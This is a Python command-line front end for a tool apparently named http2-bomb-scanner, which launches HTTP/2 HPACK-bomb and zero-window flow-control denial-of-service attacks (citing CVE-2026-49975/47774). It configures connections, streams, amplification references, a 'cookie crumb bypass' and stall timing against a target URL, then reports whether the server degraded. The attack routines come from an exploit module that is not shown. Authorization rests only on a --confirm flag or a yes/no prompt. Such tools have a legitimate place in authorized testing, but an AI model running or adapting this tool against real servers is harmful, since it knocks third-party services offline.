"""HTTP/2 Bomb test CLI — slowhttptest style UX for authorized pentest use only."""

from __future__ import annotations

import argparse
import json
import sys
from typing import Any

from .detector import DetectionResult, detect_http2
from .exploit import TestResult, run_test

BANNER = r"""
  _   _ _____ _____ ____    ____   ___  __  __ ____  _
 | | | |_   _|  ___|  _ \  | __ ) / _ \|  \/  | __ )| |
 | |_| | | | | |_  | |_) | |  _ \| | | | |\/| |  _ \| |
 |  _  | | | |  _| |  __/  | |_) | |_| | |  | | |_) | |___
 |_| |_| |_| |_|   |_|     |____/ \___/|_|  |_|____/|_____|

 HTTP/2 HPACK Bomb & Flow-Control DoS Tester (slowhttptest style)
 AUTHORIZED PENTEST USE ONLY — Written authorization required.
"""


def _print_detection(result: DetectionResult) -> None:
    print(f"\n[*] Target: {result.target}")
    print(f"    Host: {result.host}:{result.port}  TLS: {result.tls}")
    print(
        f"    HTTP/2: {result.http2_supported}  ALPN: {result.alpn_protocol}")
    if result.server_header:
        print(f"    Server: {result.server_header}")
    if result.server_guess:
        print(f"    Profile: {result.server_guess}")
    if result.settings_max_concurrent_streams is not None:
        print(
            f"    max_concurrent_streams: {result.settings_max_concurrent_streams}")
    if result.settings_initial_window_size is not None:
        print(
            f"    initial_window_size: {result.settings_initial_window_size}")
    if result.settings_max_header_list_size is not None:
        print(
            f"    max_header_list_size: {result.settings_max_header_list_size}")
    if result.error:
        print(f"    Error: {result.error}")
    for note in result.risk_notes:
        print(f"    [!] {note}")
    status = "LIKELY VULNERABLE" if result.potentially_vulnerable else "NOT VULNERABLE / NO H2"
    print(f"\n    Result: {status}")


def _print_test_config(
    target: str,
    connections: int,
    streams: int,
    references: int,
    hold_seconds: float,
    drip_interval: float,
    rate: float,
    cookie_crumbs: bool,
    crumb_count: int,
    stall: bool,
    probe_interval: float,
) -> None:
    print("\n" + "=" * 75)
    print(" slowhttp2test - HTTP/2 HPACK Bomb & Flow-Control Denial of Service Tester")
    print("=" * 75)
    print(f" Test type:              HTTP/2 HPACK BOMB & WINDOW STALL (CVE-2026-49975/47774)")
    print(f" Target:                 {target}")
    print(f" Connections:            {connections}")
    print(f" Connection rate:        {rate:.1f} conns/s")
    print(f" Streams per conn:       {streams}")
    print(f" References per stream:  {references}")
    print(
        f" Total amplification:    ~{streams * connections * references:,} references")
    print(f" Hold duration:          {hold_seconds:.1f}s")
    print(f" Window drip interval:   {drip_interval:.2f}s")
    print(
        f" Cookie crumb bypass:    {'enabled (' + str(crumb_count) + ' crumbs)' if cookie_crumbs else 'disabled'}")
    print(f" Zero-window stall:      {'enabled' if stall else 'disabled'}")
    print(f" Probe check interval:   {probe_interval:.1f}s")
    print("=" * 75 + "\n")


def _print_test_summary(result: TestResult) -> None:
    print("\n" + "=" * 75)
    print(" Test Summary & Service Assessment")
    print("=" * 75)
    print(f" Test duration:          {result.duration_s:.2f}s")
    print(f" Total streams sent:     {result.streams_sent}")
    print(
        f" Total wire bytes:       {result.wire_bytes_sent:,} bytes (~{result.wire_bytes_sent / 1024.0:.1f} KB)")
    if result.latency_before_ms is not None:
        print(f" Baseline latency:       {result.latency_before_ms:.1f} ms")
    if result.latency_after_ms is not None:
        print(f" Post-test latency:      {result.latency_after_ms:.1f} ms")
    if result.latency_delta_ms is not None:
        print(f" Latency delta:          {result.latency_delta_ms:+.1f} ms")
    print(f" Server responsive:      {result.server_responsive}")

    for note in result.notes:
        print(f" [i] {note}")
    if result.connection_errors:
        err_summary = result.connection_errors[:5]
        for err in err_summary:
            print(f" [x] {err}")
        if len(result.connection_errors) > 5:
            print(
                f" [x] ... and {len(result.connection_errors) - 5} more errors")

    print("-" * 75)
    if result.likely_vulnerable:
        print(" Verdict:                VULNERABLE — Server degradation or DoS observed")
    else:
        print(" Verdict:                INCONCLUSIVE / NOT VULNERABLE — Server remained responsive")
    print("=" * 75 + "\n")


def _to_dict(obj: Any) -> dict:
    if hasattr(obj, "__dataclass_fields__"):
        return {k: getattr(obj, k) for k in obj.__dataclass_fields__}
    return dict(obj)


def prompt_str(prompt_text: str, default: str | None = None) -> str:
    """Prompt user for a string with an optional default."""
    hint = f" [{default}]" if default is not None else ""
    while True:
        try:
            val = input(f"{prompt_text}{hint}: ").strip()
        except EOFError:
            return default or ""
        if not val and default is not None:
            return default
        if val:
            return val


def prompt_int(
    prompt_text: str,
    default: int | None = None,
    min_val: int | None = None,
    max_val: int | None = None,
) -> int:
    """Prompt user for an integer within optional bounds."""
    hint = f" [{default}]" if default is not None else ""
    while True:
        try:
            raw = input(f"{prompt_text}{hint}: ").strip()
        except EOFError:
            if default is not None:
                return default
            continue
        if not raw and default is not None:
            return default
        try:
            val = int(raw)
            if min_val is not None and val < min_val:
                print(f"[!] Value must be >= {min_val}")
                continue
            if max_val is not None and val > max_val:
                print(f"[!] Value must be <= {max_val}")
                continue
            return val
        except ValueError:
            print("[!] Please enter a valid integer.")


def prompt_float(
    prompt_text: str,
    default: float | None = None,
    min_val: float | None = None,
) -> float:
    """Prompt user for a float with optional minimum value."""
    hint = f" [{default}]" if default is not None else ""
    while True:
        try:
            raw = input(f"{prompt_text}{hint}: ").strip()
        except EOFError:
            if default is not None:
                return default
            continue
        if not raw and default is not None:
            return default
        try:
            val = float(raw)
            if min_val is not None and val < min_val:
                print(f"[!] Value must be >= {min_val}")
                continue
            return val
        except ValueError:
            print("[!] Please enter a valid number.")


def prompt_bool(prompt_text: str, default: bool = False) -> bool:
    """Prompt user for yes/no confirmation."""
    choices_hint = "[Y/n]" if default else "[y/N]"
    while True:
        try:
            raw = input(f"{prompt_text} {choices_hint}: ").strip().lower()
        except EOFError:
            return default
        if not raw:
            return default
        if raw in ("y", "yes"):
            return True
        if raw in ("n", "no"):
            return False
        print("[!] Please enter 'y' or 'n'.")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="http2-bomb-scanner",
        description=BANNER,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    # Slowhttptest-style flags
    parser.add_argument("-u", "--url", "--target", dest="target",
                        help="Target URL (e.g. https://example.com:443/)")
    parser.add_argument("-c", "--connections", type=int,
                        default=50, help="Number of connections (default: 50)")
    parser.add_argument("-s", "--streams", type=int, default=10,
                        help="Streams per connection (default: 10)")
    parser.add_argument("-x", "--references", type=int, default=500,
                        help="HPACK indexed references per stream (default: 500)")
    parser.add_argument("-l", "--duration", "--hold-seconds", dest="hold_seconds",
                        type=float, default=30.0, help="Test / hold duration in seconds (default: 30.0)")
    parser.add_argument("-i", "--interval", "--drip-interval", dest="drip_interval",
                        type=float, default=1.0, help="Window update drip interval in seconds (default: 1.0)")
    parser.add_argument("-r", "--rate", type=float, default=50.0,
                        help="Connections per second rate (default: 50.0)")
    parser.add_argument("-p", "--probe-interval", type=float, default=5.0,
                        help="Service latency probe interval (default: 5.0)")
    parser.add_argument("-k", "--cookie-crumbs", action="store_true",
                        help="Enable Cookie crumb bypass (RFC 9113 / Apache / Envoy)")
    parser.add_argument("--crumb-count", type=int, default=32,
                        help="Number of cookie crumbs to seed (default: 32)")
    parser.add_argument("--no-stall", action="store_true",
                        help="Disable zero-window flow control stall")
    parser.add_argument("-t", "--timeout", type=float, default=15.0,
                        help="Socket timeout in seconds (default: 15.0)")
    parser.add_argument("-d", "--detect", action="store_true",
                        help="Run passive detection / fingerprint only")
    parser.add_argument("-I", "--interactive", action="store_true",
                        help="Run interactive prompt wizard")
    parser.add_argument("--confirm", action="store_true",
                        help="Confirm authorization to test target")
    parser.add_argument("--json", action="store_true",
                        help="Output results in JSON format")

    return parser


def run_interactive_wizard(default_target: str | None = None) -> int:
    """Interactive slowhttptest-style prompt wizard."""
    print(BANNER)
    print("Welcome to interactive slowhttptest for HTTP/2 Bomb (CVE-2026-49975 / 47774)\n")

    target_in = prompt_str("Target URL or host (e.g. https://example.com)",
                           default=default_target or "https://127.0.0.1:443")
    if "://" not in target_in:
        target_in = f"https://{target_in}"

    print("\n[*] Choose action:")
    print("    [1] Run Test (HTTP/2 HPACK Bomb + Flow Control Stall)")
    print("    [2] Detect & Fingerprint HTTP/2 only (Passive)")
    action = prompt_str("Select action [1-2]", default="1")

    if action == "2":
        timeout = prompt_float("Probe timeout (seconds)",
                               default=10.0, min_val=0.5)
        print(f"\n[*] Probing {target_in}...")
        res = detect_http2(target_in, timeout=timeout)
        _print_detection(res)
        return 0 if res.http2_supported else 1

    print("\n--- Test Parameters Configuration ---")
    connections = prompt_int(
        "Number of parallel connections (-c)", default=50, min_val=1, max_val=5000)
    streams = prompt_int("Streams per connection (-s)",
                         default=10, min_val=1, max_val=1000)
    references = prompt_int(
        "HPACK references per stream (-x)", default=500, min_val=1, max_val=50000)
    duration = prompt_float(
        "Test / hold duration in seconds (-l)", default=30.0, min_val=1.0)
    rate = prompt_float("Connection rate (conns/second) (-r)",
                        default=50.0, min_val=0.1)
    stall = prompt_bool("Enable zero-window flow control stall?", default=True)
    drip = 1.0
    if stall:
        drip = prompt_float(
            "Window update drip interval (-i) [seconds]", default=1.0, min_val=0.01)
    cookie_crumbs = prompt_bool(
        "Enable Cookie crumb bypass (-k)?", default=False)
    crumb_count = 32
    if cookie_crumbs:
        crumb_count = prompt_int(
            "Crumb count", default=32, min_val=1, max_val=512)
    probe_interval = prompt_float(
        "Probe interval (-p) [seconds]", default=5.0, min_val=1.0)
    timeout = prompt_float(
        "Socket timeout (-t) [seconds]", default=15.0, min_val=1.0)

    print("\n" + "=" * 60)
    print(f"[!] AUTHORIZATION CHECK: Testing target '{target_in}'")
    print("=" * 60)
    confirmed = prompt_bool(
        "Do you have explicit authorization to test this target?", default=False)
    if not confirmed:
        print("[!] Aborted: Authorization required.")
        return 2

    _print_test_config(
        target=target_in,
        connections=connections,
        streams=streams,
        references=references,
        hold_seconds=duration,
        drip_interval=drip,
        rate=rate,
        cookie_crumbs=cookie_crumbs,
        crumb_count=crumb_count,
        stall=stall,
        probe_interval=probe_interval,
    )

    def _status_cb(msg: str) -> None:
        print(msg)

    try:
        result = run_test(
            target=target_in,
            connections=connections,
            streams=streams,
            references=references,
            hold_seconds=duration,
            window_drip_interval=drip,
            rate=rate,
            probe_interval=probe_interval,
            use_cookie_crumbs=cookie_crumbs,
            crumb_count=crumb_count,
            stall=stall,
            timeout=timeout,
            status_callback=_status_cb,
        )
        _print_test_summary(result)
        return 0 if not result.likely_vulnerable else 3
    except KeyboardInterrupt:
        print("\n[!] Test stopped by user.")
        return 0


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    # If no target and no specific flags, or -I specified, run interactive wizard
    if args.interactive or (not args.target and not args.detect):
        return run_interactive_wizard(default_target=args.target)

    target = args.target
    if "://" not in target:
        target = f"https://{target}"

    if args.detect:
        res = detect_http2(target, timeout=args.timeout)
        if args.json:
            print(json.dumps(_to_dict(res), indent=2))
        else:
            _print_detection(res)
        return 0 if res.http2_supported else 1

    if not args.confirm:
        print("[!] Refusing to run test without --confirm (authorization required).")
        print(
            f"    Example: python -m http2_bomb -u {target} -c {args.connections} -s {args.streams} -x {args.references} --confirm")
        return 2

    if not args.json:
        _print_test_config(
            target=target,
            connections=args.connections,
            streams=args.streams,
            references=args.references,
            hold_seconds=args.hold_seconds,
            drip_interval=args.drip_interval,
            rate=args.rate,
            cookie_crumbs=args.cookie_crumbs,
            crumb_count=args.crumb_count,
            stall=not args.no_stall,
            probe_interval=args.probe_interval,
        )

    def _status_cb(msg: str) -> None:
        if not args.json:
            print(msg)

    result = run_test(
        target=target,
        connections=args.connections,
        streams=args.streams,
        references=args.references,
        hold_seconds=args.hold_seconds,
        window_drip_interval=args.drip_interval,
        rate=args.rate,
        probe_interval=args.probe_interval,
        use_cookie_crumbs=args.cookie_crumbs,
        crumb_count=args.crumb_count,
        stall=not args.no_stall,
        timeout=args.timeout,
        status_callback=_status_cb,
    )

    if args.json:
        print(json.dumps(_to_dict(result), indent=2))
    else:
        _print_test_summary(result)

    return 0 if not result.likely_vulnerable else 3


if __name__ == "__main__":
    sys.exit(main())
